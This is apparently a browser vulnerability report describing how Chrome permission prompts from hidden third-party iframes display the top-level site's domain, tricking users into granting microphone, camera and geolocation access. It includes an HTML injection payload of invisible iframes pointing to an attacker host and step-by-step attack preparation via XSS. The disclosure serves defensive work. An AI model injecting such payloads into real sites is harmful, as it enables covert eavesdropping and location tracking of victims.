<h3>The problem</h3>
<h4>Please describe the technical details of the vulnerability</h4>
<p>Chrome Desktop incorrectly shows/displays domains on  permission prompts  from third-party iframes to the top-level origin, misleading users into granting permissions(microphone, camera, and geolocation) access to malicious domains.</p>
<p><strong>Attacker Preparation:</strong>
-&gt; Host malicious code on 12x.site (e.g., a microphone recording script).
-&gt; Identify an XSS vulnerability or an HTML injection flaw on a trusted site (<a href="https://begbounty.xyz" data-b-widget="url" data-b-original-href="https://begbounty.xyz" data-b-redirected-href="https://www.google.com/url?q=https://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1qa7PS6lPnw3qJxuIXV9FD">https://begbounty.xyz</a>).</p>
<ul>
<li>Inject an iframe through the vulnerable input field, such as a comment section or embedded widget, using the below-mentioned payload HTML Payload</li>
</ul>
<pre><code>&lt;iframe id=&quot;legitimate-content&quot; src=&quot;https://12x.site/poc.html&quot; allow=&quot;microphone&quot; style=&quot;opacity: 0;&quot;&gt;&lt;/iframe&gt; &lt;iframe id=&quot;legitimate-content&quot; src=&quot;https://12x.site/pocx.html&quot; allow=&quot;camera&quot; style=&quot;opacity: 0;&quot;&gt;&lt;/iframe&gt;&lt;iframe id=&quot;legitimate-content&quot; src=&quot;https://12x.site/attacker/map.php/attacker/map.php&quot; allow=&quot;geolocation&quot; style=&quot;opacity: 0;&quot;&gt;&lt;/iframe&gt;

</code></pre>
<p><strong>User Interaction:</strong></p>
<p>-&gt; A user visits begbounty.xyz, where the attacker&#39;s script dynamically injects the malicious iframe.</p>
<p>-&gt; Chrome Desktop displays a misleading prompt:</p>
<p>-&gt; &quot;Allow begbounty.xyz to access your microphone, camera, geolocation?&quot;</p>
<p>-&gt; The prompt does not indicate that the permission is actually being requested by 12x.site.</p>
<p><strong>Exploitation:</strong></p>
<p>If the user clicks “Allow,” 12x.site gains persistent access to:</p>
<p>-- Microphone (audio eavesdropping)</p>
<p>-- Camera (photo/video capture)</p>
<p>-- Geolocation (real-time tracking)</p>
<p>The attacker records audio, takes photos, and tracks the victim’s location in real-time and exfiltrates the data to their server.</p>
<p><strong>DETAILED Excplaination about &quot;allow attribute &amp; permission policy&quot;</strong></p>
<p>-&gt; It clearly illustrates a real-world attack scenario in Chrome Desktop, going beyond just an issue related to iframe allow= attributes. The HTML payload includes an iframe with the allow attribute, and the attacker has control over how the payload is crafted.</p>
<p>-&gt;  Permission Policy header is not relevant to the actual vulnerability being discussed. This issue is not about whether a Permission Policy header is set or not; rather, it concerns Origin Display Manipulation on Permission Prompts—the core vulnerability here.</p>
<p>-&gt; The exploit allows the permission prompt to display one domain while actually granting permissions to a different domain. This is the fundamental security flaw, not the absence or presence of a Permission Policy header.</p>
<p>-&gt; To demonstrate this, I exploited an HTML injection vulnerability on begbounty.xyz, but this attack is not limited to just this site.</p>
<p>-&gt; Any website vulnerable to HTML injection or XSS can be abused in the same way, making this a more widespread issue.</p>
<ul>
<li>
<blockquote>
<p>Not every website implements a Permission Policy header, as it is not a default security measure enforced by browsers—it is entirely up to individual site owners to configure it.</p>
</blockquote>
</li>
</ul>
<p><strong>The Core Issue:</strong></p>
<p>The real security concern is that an attacker can manipulate permission prompts to deceive users, leading them to unknowingly grant permissions to an unintended domain. This is a significant vulnerability that goes beyond whether a Permission Policy header is present.</p>

<h4>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
<p><strong>Who Can Exploit It?</strong></p>
<p>Attackers who find an XSS vulnerability or an HTML injection flaw on a trusted website can exploit this issue.</p>
<p>Malicious actors embedding iframes in websites where users are likely to trust permission requests.</p>
<p><strong>What Attackers Gain?</strong></p>
<p>Persistent Microphone &amp; Audio Eavesdropping:</p>
<p>Attackers can listen to conversations in real-time.</p>
<p>Recorded audio is silently exfiltrated to an attacker-controlled server.</p>
<p>Real-Time Geolocation Tracking:</p>
<p>Attackers can track a victim’s live location using geolocation.watchPosition().</p>
<p>This allows real-time monitoring of user movements without their knowledge.</p>
<p>Potential Camera Exploitation:</p>
<p>If allow=&quot;camera&quot; is included in the iframe, attackers may gain camera access without the user realizing it.</p>
